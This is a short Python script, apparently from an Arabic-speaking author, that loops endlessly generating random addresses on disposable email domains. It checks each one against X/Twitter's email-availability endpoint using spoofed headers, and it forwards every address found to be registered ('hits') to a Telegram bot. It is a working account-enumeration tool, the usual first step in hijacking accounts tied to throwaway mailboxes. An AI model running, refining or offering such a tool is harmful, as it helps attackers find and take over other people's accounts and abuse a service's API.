

import os,sys,threading
import requests,random
from user_agent import *

OK = 0
BAD = 0
Lock = threading.Lock()


R = '\x1b[38;5;1m'   # أحمر
M = '\x1b[38;5;244m' # رمادي 
L = '\x1b[38;5;10m' #اخضر 


tok =input(f"{L} TOKEN :{R}")
os.system("clear")

id =input(f"{L} ID :{R}")
os.system("clear")

if not tok or not id:
	print(R+" لازمك تدخل توكن وايدي ")
	sys.exit()


def send_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{tok}/sendMessage"
        data = {"chat_id": id, "text": message}
        requests.post(url, data=data, timeout=5)
    except:
        pass

print(
	f"{L}{'—'*60}\n"
	f"{L} [1] {M} yopmail \n"
	f"{L}{'—'*60}\n"
	f"{L} [2] {M} hi2.in \n"
	f"{L}{'—'*60}\n"
	f"{L} [3] {M} telegmail \n"
	f"{L}{'—'*60} \n"
	)       
        
choice =input(f"{L} choice :").strip()
os.system("clear")



if not choice:
	print(R+"   لازم تحتار دومين منهم  ")
	sys.exit()

elif choice == "1":
	domain = "@yopmail.com"
elif choice == "2":
	domain = "@hi2.in"
elif choice == "3":
	domain = "@telegmail.com"

ibra = "qwertyuioplkjhgfdsamnbvcxz"
while True:
	len = random.randint(3,5)
	email ="".join(random.choice(ibra) for _ in range (len))  + domain 
	
	headers = {
	        'accept': '*/*',
	        'accept-language': 'ar',
	        'origin': 'https://x.com',
	        'referer': 'https://x.com/',
	        'user-agent': generate_user_agent()
	    }
	    
	params = {'email': email}
	    
	response = requests.get('https://api.x.com/i/users/email_available.json', params=params, headers=headers).text
	  
	    
	   
	   
	   
	if '"taken":true' in response:
		
		b1 = f" NEW hits Twiter ✅"
		b2 = f" email : {email}"
		b3 = f" Developer : @BR_Go_16 "
		msg = f"{b1}\n{b2}\n{b3}"
		send_telegram(msg)
		
		OK += 1
	else:
		BAD += 1
		
	print(f"\r Good : {OK} | BAD : {BAD} | email : {email}",end="")
		
